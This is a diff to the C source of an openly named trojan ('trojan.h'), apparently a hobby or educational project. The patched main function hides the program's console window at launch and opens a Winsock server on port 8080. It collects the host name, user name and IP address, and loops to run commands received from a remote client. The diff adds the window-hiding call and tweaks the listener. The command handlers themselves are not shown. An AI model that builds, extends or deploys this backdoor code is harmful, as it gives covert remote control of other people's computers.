@@ -7,14 +7,15 @@ email: forec@bupt.edu.cn
 #include "trojan.h"
 
 int main(int argc, char *argv[]){
-	//ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);   // hide window
+	HWND  hDos = GetForegroundWindow();
+	ShowWindow(hDos, SW_HIDE);	 // hide window
 
 	fd_set rfd;
 	u_long ul = 1;
 	struct timeval timeout;
 	DWORD bufCharCount = 32767;
 
-	char sendBuf[SEND_BUFLEN], recvBuf[RECV_BUFLEN], *pszAddr;
+	char sendBuf[SEND_BUFLEN], recvBuf[RECV_BUFLEN], *pszAddr = NULL;
 	char hostName[INFO_BUFLEN] = { 0 },
 		 userName[INFO_BUFLEN] = { 0 },
 		       ip[INFO_BUFLEN] = { 0 };
@@ -31,6 +32,7 @@ int main(int argc, char *argv[]){
 	timeout.tv_usec = 0;
 
 	wVersionRequested = MAKEWORD(2, 2); // config windows socket
+
 	while (true){						// loop until socket configured
 		int err = WSAStartup(wVersionRequested, &wsaData);
 		if (err != 0){
@@ -57,8 +59,10 @@ int main(int argc, char *argv[]){
 	addrServer.sin_family = AF_INET;
 	addrServer.sin_port = htons(8080);
 
+	printf("Server run at IPv4 address %s ...\n", pszAddr);
+
 	bind(sockServer, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));
-	listen(sockServer, 10);
+	listen(sockServer, 1);
 
 	HINSTANCE hInstance;
 	hInstance = GetModuleHandle(0);
@@ -83,16 +87,19 @@ int main(int argc, char *argv[]){
 			}
 		}
 
+		//printf("remote client connected..\n");
+
 		while (true){
-			Sleep(1000);
 			if (FD_ISSET(sockClient, &rfd)){
 				memset(recvBuf, 0, sizeof(recvBuf));
-				int recvLen = recv(sockClient, recvBuf, RECV_BUFLEN, 0);
+				int recvLen = recv_s(sockClient, recvBuf, RECV_BUFLEN);
 				if (recvLen == SOCKET_ERROR)
 					break;
 				dealWithCommand(sendBuf, recvBuf, recvLen, sockClient);
 			}
 		}
+
+		//printf("remote client disconnected..\n");
 	}
 	return 0;
 }
